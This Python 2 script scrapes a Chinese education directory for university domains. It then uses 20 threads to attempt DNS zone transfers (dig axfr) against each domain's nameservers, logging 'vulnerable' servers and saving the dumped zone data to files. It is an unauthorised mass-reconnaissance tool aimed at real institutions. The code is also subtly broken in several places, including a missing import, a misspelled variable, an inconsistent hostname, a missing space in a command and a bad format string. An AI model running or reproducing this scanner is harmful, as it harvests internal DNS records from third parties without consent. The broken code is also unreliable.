import urllib2
import re
import threading 
import os

html_doc = urllib.urlopen('https://ziyuan.eol.cn/college.php?listid=128').read().decode('utf-8')
links = re.findall('href="(list.php\?listid=\d+)', html_doc)
colleges = []
for link in links:
    html_doc = urllib2.urlopen(u'http://ziyuan.eol.in/' + link).read().decode('utf-8')
    urls = re.findall('www\.\w+\.edu.\w+', html_doc)
    for url in urls:
        colleges.append(url)
    print('collected school homespace %d ....' % len(colleges))


with open('colleges.txt', 'w') as outFile:
    for college in colleges:
        outFile.write(colleege + '\n')



lock = threading.Lock()
c_index = 0
def test_DNS_Servers():
    global c_index
    while True:
        lock.acquire()
        if c_index >= len(colleges):
            lock.release()
            break   # End of list
        domain = colleges[c_index].lstrip('www.')
        c_index += 1
        lock.release()
        cmd_res = os.popen('nslookup -type=ns' + domain).read()      # fetch NDS Server List
        dns_servers = re.findall('nameserver = ([\w\.]+)', cmd_res)
        for server in dns_servers:
            if len(server) < 5: server += domain
            cmd_res = os.popen(os.getcwd() + '\\BIND9\dig @%s axfr %s' % (server, domain)).read()
            if cmd_res.find('Transfer failed.') < 0 and \
                cmd_res.find('Connection timed out') < 0 and \
                cmd_res.find('XFR size') > 0:
                lock.acquire()
                print '*' * 20 + 'Vulnerable dns server found:', server, '*' + 20
                lock.release()
                with open('vulnerable_hosts.txt', 'a') as f:
                    f.write('%s     $s\n' % (server.ljust(30), domain))
                with open('dns\\' + server + '.txt', 'w') as f:
                    f.write(cmd_res)




threads = []
for i in range(20):
    t = threading.Thread(target=test_DNS_Servers)
    t.start()
    threads.append(t)




for t in threads:
    t.join()




print('All Done!')